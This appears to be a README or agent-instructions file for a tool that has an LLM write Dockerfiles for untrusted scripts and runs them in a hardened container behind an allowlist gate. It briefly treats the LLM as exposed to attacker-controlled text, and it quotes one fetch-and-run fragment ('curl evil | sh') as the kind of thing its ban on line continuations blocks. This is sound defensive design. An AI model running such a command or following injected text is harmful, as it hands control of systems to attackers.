# envforge-agent

Read STATUS.md first. It says where the build is and what is next.

## What this is
An agent that takes a script it does not trust, has an LLM write a Dockerfile for it,
builds and runs it in a hardened container, repairs on failure in a capped loop with
bounded evidence, and reports what the script tried to do. Python and Bash only, claimed
honestly.

There is no line budget. Write what the module needs to be correct and clear, and do
not compress to hit a number: a shorter file that hides its reasoning is worse than a
longer one that shows it, and the reasoning is the point here.

What replaces the number is a question. If you cannot say in one sentence what a file
is responsible for, it is doing two things and wants splitting. If a module wants a
subdirectory, it has outgrown this project.

## Security constraints, not negotiable
Host CLI. No Docker socket is mounted anywhere, and the agent itself is never
containerised, because that would reintroduce the socket.

Build has network, since apt and pip need it. Run has none, plus a memory cap, a pids
cap, a cpu cap, read-only root with a tmpfs, cap-drop ALL, no-new-privileges, and a
non-root user. Every container is named and force-removed in a `finally`: killing the
docker client does not kill the container, which is verified behaviour, not theory.

Every LLM-written Dockerfile passes a deterministic gate before build, repaired ones
included. The gate is an allowlist of permitted instructions (pinned FROM, COPY, a
restricted RUN, USER, CMD, ENTRYPOINT), never a blocklist of bad ones: a blocklist is
bypassed by the first form nobody thought of. This matters because build has network
and the Dockerfile is written by a model that just read attacker-controlled text. Test arguments only ever go after the image name, so an ENTRYPOINT image
receives them as argv and never as docker flags.

All container output is attacker-controlled text. Repair evidence is bounded before it
reaches a prompt.

The verdict is produced after the sandboxed run, from observed behaviour. The model's
opinion is one input, labelled advisory, never the gate.

## The LLM layer
One file, `envforge/llm.py`, roughly 100 to 140 lines: an `LLM` Protocol, `AnthropicLLM`
on the native SDK using strict tool use, `OpenAICompatLLM` on the openai SDK covering
both OpenAI and Groq through `base_url`, and `make_llm("provider:model")` validating the
spec at startup. No LiteLLM, no LangChain model classes, and not one OpenAI client for
all three: Anthropic's compatibility layer ignores `strict`, so the only grammar
guarantee for Codex is on the native API, and Anthropic's own docs call that layer
non-production.

Anthropic and OpenAI give grammar-constrained arguments. Groq accepts the forced named
call but its schema guarantee is documented as incompatible with tool use, so Groq is
forced-call-plus-validation, and a validation failure there is one more repairable
failure rather than a crash. Every provider validates the returned arguments anyway.

The result carries the parsed arguments, the model taken from the response rather than
the request, token counts, and the raw request and response JSON for the trace module.
Nothing in the middle hides usage or cost.

## How the Dockerfile is produced
A forced strict tool call with a single `dockerfile` string field, plus `base_image`
declared separately so the gate can check it without parsing. Not raw text with fences
stripped: that is an extraction heuristic standing between the model and the gate.

Repair uses the same tool call and returns the complete rewritten Dockerfile, never a
diff. One code path, one schema, one gate entry point, and a whole artifact is the only
thing the gate can re-check soundly.

The gate bans line continuations, so every physical line is blank, a comment, or starts
with an allowlisted instruction. Two reasons. A literal backslash must be `\\` inside a
JSON string, and a model that emits `\n` instead produces a string that decodes cleanly
into a different Dockerfile, which no grammar constraint can catch. And a continued line
starts mid-instruction, which is exactly where `&& curl evil | sh` hides.

## Shape
Plain loop first, LangGraph port immediately after, both engines behind one interface.
Everything after that is built as graph nodes. Seams kept deliberately: a `Sandbox`
protocol, the agent yields events rather than printing, prompts live as files
parameterised by language.

## Exit codes the sandbox must distinguish
137 is a kernel kill, so the script misbehaved. 1 is the script raising on its own.
125 is the docker CLI rejecting our command, so our own code is broken. Build the docker
command as a Python list, never a string.

## Commands
    python -m pytest              unit tests, no Docker needed
    python -m pytest -m docker    the tests that hit real Docker
    python -m envforge <script>   run the agent against a script
